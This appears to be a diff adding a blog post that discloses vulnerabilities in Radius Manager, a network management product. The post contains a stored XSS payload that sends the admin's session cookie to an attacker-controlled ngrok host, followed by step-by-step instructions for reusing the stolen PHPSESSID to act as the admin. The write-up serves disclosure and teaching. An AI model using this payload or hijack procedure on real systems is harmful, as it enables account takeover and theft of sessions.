+  <a href="#cross-site-scripting-xss" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>We first need to inject our script into an input field so that whenever an admin logs in &amp; lists the available access points, their cookie is sent to us (the attacker in this scenario).</p>
+<p>The script used that will be injected is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span> 
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xl</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>(); 
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://dat.ngrok.io/cookie=&#39;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>; 
+<span style="color:#a6e22e">xl</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#a6e22e">url</span>, <span style="color:#66d9ef">false</span>); <span style="color:#a6e22e">xl</span>.<span style="color:#a6e22e">send</span>();<span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">xl</span>.<span style="color:#a6e22e">responseText</span>);
+<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div><p>where dat is the subdomain generated by ngrok. And we will be injecting it into the description field when adding/editing an access point.</p>
+<p>After listing the available access points as an admin, this is what an attacker would see:</p>
+<p><img src="./imgs/img3.png" alt=""></p>
+<p>As you can see, we have everything we need in order to impersonate the admin user and this was achieved just by having them list the available access points. This of course requires that an attacker already have an account registered on the Radius Manager with sufficient privileges to add/edit an access point.</p>
+<h3 id="broken-session-management-exploitation">
+  Broken Session Management Exploitation
+  <a href="#broken-session-management-exploitation" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The next stage of the attack would be abusing the broken session management in order to make requests on someone else&rsquo;s behalf without their interaction. This simply involves intercepting the request exchanging the cookie parameter with the stolen one:</p>
+<ol>
+<li>Make the original request for adding a user from an account with low privileges &amp; you will get a response that looks like this:</li>
+</ol>
+<p><img src="./imgs/img.png" alt=""></p>
+<ol start="2">
+<li>Now do repeat step 1 &amp; sniff the request out with Firefox&rsquo;s network monitoring tool (inspect element &gt; network):</li>
+</ol>
+<p><img src="./imgs/img2.png" alt=""></p>
+<ol start="3">
+<li>Right-click the request &amp; hit <em>Edit and Resend</em> &amp; change the <em>Cookie: PHPSESSID</em> value for the stolen cookie &amp; change the <em>login_admin</em> value for the value provided by the stolen session cookie. After doing so &amp; resending the request, now we can make requests as the admin user:</li>
+</ol>
+<p><img src="./imgs/img5.png" alt=""></p>
+<ul>
+<li><strong>NOTE: This requires the admin to be currently logged in. If the admin is logged out then the session cookie is invalid until they login again. But the session cookie does not change once they log out. It stays the same.</strong></li>
+</ul>
+
+    </div>
+    
+
+    
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >1d8 blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
